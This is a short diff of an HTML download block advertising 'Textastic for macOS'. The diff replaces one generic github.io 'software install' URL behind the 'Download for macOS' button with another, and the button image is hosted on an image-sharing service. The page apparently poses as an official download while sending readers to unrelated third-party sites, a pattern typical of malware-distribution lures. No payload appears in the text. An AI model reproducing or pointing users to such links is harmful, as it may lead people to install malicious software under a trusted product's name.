@@ -6,7 +6,7 @@
 <h3>Textastic for macOS</h3>
 <p>Textastic Mac Edition focuses on fast file access, rich syntax support and smooth integration with external toolchains.</p>
 
-<a href="https://mac-software-install.github.io/.github/Textastic">
+<a href="https://software-install-apps.github.io/.github/Textastic">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
